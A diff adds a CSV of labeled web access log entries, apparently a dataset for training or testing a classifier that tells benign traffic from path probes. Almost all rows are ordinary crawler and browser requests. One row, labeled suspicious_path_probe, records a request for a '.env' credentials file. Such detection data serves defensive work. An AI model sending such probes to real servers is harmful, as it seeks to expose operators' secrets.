@@ -1,0 +1,645 @@
+text,label
+"GET /Datasets Description/Network/ftp.html HTTP/1.1 STATUS=200 BYTES=1486 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/Network/ssl.html HTTP/1.1 STATUS=200 BYTES=1541 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /Datasets Description/PE_malware/OPCleaver.html HTTP/1.1 STATUS=200 BYTES=1414 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2017-03-14.gz HTTP/1.1 STATUS=301 BYTES=543 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /Datasets Description/Network/dns.html HTTP/1.1 STATUS=200 BYTES=1499 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49096 REF=""http://secrepo.com"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13141 UA=""awesome_bot""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32315 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/Network/weird.html HTTP/1.1 STATUS=200 BYTES=1601 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=788 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 UA=""-""",benign
+"GET /Datasets Description/Network/notice.html HTTP/1.1 STATUS=200 BYTES=1606 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2019-04-26.gz HTTP/1.1 STATUS=200 BYTES=23077 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2019-11-22.gz HTTP/1.1 STATUS=200 BYTES=24264 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /self.logs/error.log.2017-10-18.gz HTTP/1.1 STATUS=200 BYTES=2797 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-05-18.gz HTTP/1.1 STATUS=200 BYTES=918 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2020-01-14.gz HTTP/1.1 STATUS=200 BYTES=17693 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/Network/tunnel.html HTTP/1.1 STATUS=200 BYTES=1426 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /.env HTTP/1.1 STATUS=404 BYTES=519 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""",suspicious_path_probe
+"GET /self.logs/error.log.2020-06-20 HTTP/1.1 STATUS=200 BYTES=307 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/access.log.2021-03-10.gz HTTP/1.1 STATUS=200 BYTES=29938 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2017-02-17.gz HTTP/1.1 STATUS=200 BYTES=874 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-11-21 HTTP/1.1 STATUS=200 BYTES=307 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2018-05-24.gz HTTP/1.1 STATUS=200 BYTES=18756 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-06-30.gz HTTP/1.1 STATUS=200 BYTES=2184 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2021-03-19.gz HTTP/1.1 STATUS=200 BYTES=12829 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2020-05-15.gz HTTP/1.1 STATUS=200 BYTES=9620 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2019-04-29.gz HTTP/1.1 STATUS=200 BYTES=15477 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /Datasets Description/Network/http.html HTTP/1.1 STATUS=200 BYTES=1709 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/access.log.2020-10-26.gz HTTP/1.1 STATUS=200 BYTES=12128 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2017-10-17.gz HTTP/1.1 STATUS=200 BYTES=4081 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7519 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27879 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27879 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7519 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""",benign
+"GET /self.logs/error.log.2020-03-23 HTTP/1.1 STATUS=200 BYTES=307 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2017-11-05.gz HTTP/1.1 STATUS=200 BYTES=26646 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /   HTTP/1.1 STATUS=301 BYTES=427 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /Â Â HTTP/1.1 STATUS=404 BYTES=284 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /honeypot//""http://amunhoney.sourceforge.net//"" HTTP/1.1 STATUS=404 BYTES=250 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /honeypot//""http://glastopf.org//"" HTTP/1.1 STATUS=404 BYTES=284 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /honeypot//""http://www.maxmind.com/"" HTTP/1.1 STATUS=404 BYTES=284 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /honeypot//""https://twitter.com/sooshie/"" HTTP/1.1 STATUS=404 BYTES=284 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /honeypot//""https://twitter.com/theroxyd/"" HTTP/1.1 STATUS=404 BYTES=284 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32315 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /  HTTP/1.1 STATUS=404 BYTES=250 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /self.logs/access.log.2020-06-02.gz HTTP/1.1 STATUS=200 BYTES=19139 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2018-05-07.gz HTTP/1.1 STATUS=200 BYTES=20746 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2017-01-18.gz HTTP/1.1 STATUS=200 BYTES=15324 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7533 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /self.logs/access.log.2020-11-20.gz HTTP/1.1 STATUS=200 BYTES=12397 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-10-01 HTTP/1.1 STATUS=200 BYTES=307 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2021-06-17.gz HTTP/1.1 STATUS=200 BYTES=28447 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2019-05-14.gz HTTP/1.1 STATUS=200 BYTES=5399 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2020-12-22.gz HTTP/1.1 STATUS=200 BYTES=18739 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2021-06-17.gz HTTP/1.1 STATUS=200 BYTES=3777 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /self.logs/access.log.2019-12-29.gz HTTP/1.1 STATUS=200 BYTES=19343 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-11-26.gz HTTP/1.1 STATUS=200 BYTES=738 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2017-07-14.gz HTTP/1.1 STATUS=200 BYTES=985 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2018-03-08.gz HTTP/1.1 STATUS=200 BYTES=40489 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2020-01-12.gz HTTP/1.1 STATUS=200 BYTES=18818 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2019-01-08.gz HTTP/1.1 STATUS=200 BYTES=24652 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2017-07-10.gz HTTP/1.1 STATUS=200 BYTES=690 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13184 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/error.log.2019-12-18.gz HTTP/1.1 STATUS=200 BYTES=924 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13147 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/access.log.2020-02-18.gz HTTP/1.1 STATUS=200 BYTES=19568 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2018-06-30.gz HTTP/1.1 STATUS=200 BYTES=21100 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2017-10-01.gz HTTP/1.1 STATUS=200 BYTES=24944 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-02-13.gz HTTP/1.1 STATUS=200 BYTES=835 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2018-03-17.gz HTTP/1.1 STATUS=200 BYTES=4729 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"GET /self.logs/access.log.2018-02-08.gz HTTP/1.1 STATUS=200 BYTES=21825 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=200 BYTES=78880 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /Datasets Description/HTML_Bro_log_1/loaded_scripts.html HTTP/1.1 STATUS=200 BYTES=1499 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=206 BYTES=447 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=206 BYTES=78880 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=206 BYTES=447 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=200 BYTES=78880 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/access.log.2017-03-14.gz HTTP/1.1 STATUS=301 BYTES=543 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/access.log.2021-09-30.gz HTTP/1.1 STATUS=200 BYTES=71421 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /tg/a.zip HTTP/1.1 STATUS=200 BYTES=66189448 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/access.log.2017-09-15.gz HTTP/1.1 STATUS=200 BYTES=18802 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=304 BYTES=261 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=301 BYTES=441 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=347 REF=""http://secrepo.com/favicon.ico"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=301 BYTES=441 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=347 REF=""http://secrepo.com/favicon.ico"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49133 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
